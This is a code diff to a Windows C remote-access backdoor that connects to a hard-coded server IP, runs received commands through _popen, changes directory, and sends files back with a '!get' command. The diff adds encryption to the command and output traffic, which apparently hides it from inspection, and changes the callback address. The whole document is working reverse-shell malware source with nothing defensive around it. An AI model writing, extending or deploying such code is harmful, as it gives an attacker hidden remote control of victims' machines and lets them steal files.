@@ -9,6 +9,9 @@
 #include <sys/stat.h>
 #include <sys/types.h>
 #include <string.h>
+#include <stdint.h>
+
+#include "crypto.h"
 
 #define STATUS_DONE "[+]Done\n"
 #define STATUS_END "[+]End\n"
@@ -35,7 +38,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 
 	struct sockaddr_in Serv;
 	memset(&Serv, 0, sizeof(Serv));
-	char * ServIP = "192.168.1.182";
+	char * ServIP = "192.168.1.220";
 
 	Serv.sin_family = AF_INET;
 	Serv.sin_addr.s_addr = inet_addr(ServIP);
@@ -57,11 +60,14 @@ void cmdshell(void)
 {
 	char cmd[1024];
 	char res[1024];
+	char cur_status[1024];
 	while (1)
 	{
 		memset(cmd, 0, sizeof(cmd));
 		memset(res, 0, sizeof(res));
+		memset(cur_status, 0, sizeof(cur_status));
 		recv(sock, cmd, sizeof(cmd), 0);
+		decrypt(cmd);
 		
 		if (!strncmp(cmd, "!exit", 5)) //quit
 		{
@@ -73,7 +79,8 @@ void cmdshell(void)
 		{
 			char * dirname = &cmd[3];
 			chdir(dirname);
-			send(sock, STATUS_DONE, 1024, 0);
+			strcpy(cur_status, STATUS_DONE);
+			send(sock, encrypt(cur_status), 1024, 0);
 		}
 		else if (!strncmp(cmd, "!get ", 5))
 		{
@@ -81,22 +88,24 @@ void cmdshell(void)
 			FILE * fp = fopen(filename, "rb");
 			if (fp == NULL)
 			{
-				send(sock, STATUS_ERR, 1024, 0);
+			    strcpy(cur_status, STATUS_ERR);
+				send(sock, encrypt(cur_status), 1024, 0);
 				continue;
 			}
 			unsigned long nread;
-		       	nread = fread(res, sizeof(char), sizeof(res), fp);
+		    nread = fread(res, sizeof(char), sizeof(res), fp);
 			while (nread == sizeof(res))
 			{
-				send(sock, res, sizeof(res), 0);
+				send(sock, encrypt(res), sizeof(res), 0);
 				memset(res, 0, sizeof(res));
-		       		nread = fread(res, sizeof(char), sizeof(res), fp);
+		        nread = fread(res, sizeof(char), sizeof(res), fp);
 			}
-			send(sock, STATUS_END, 1024, 0);
+			strcpy(cur_status, STATUS_END);
+			send(sock, encrypt(cur_status), 1024, 0);
 			nread = htonl(nread);
 			send(sock, (unsigned char *)&nread, 8, 0);
 			nread = ntohl(nread);
-			send(sock, res, nread, 0);
+			send(sock, encrypt(res), sizeof(res), 0);
 			fclose(fp);
 		}
 		else
@@ -104,10 +113,11 @@ void cmdshell(void)
 			FILE * fp = _popen(cmd, "r"); //execute cmd
 			while (fgets(res, sizeof(res), fp) != NULL)
 			{
-				send(sock, res, sizeof(res), 0);
+				send(sock, encrypt(res), sizeof(res), 0);
 				memset(res, 0, sizeof(res));
 			}
-			send(sock, STATUS_DONE, 1024, 0);
+			strcpy(cur_status, STATUS_DONE);
+			send(sock, encrypt(cur_status), 1024, 0);
 			fclose(fp);
 		}
 	}
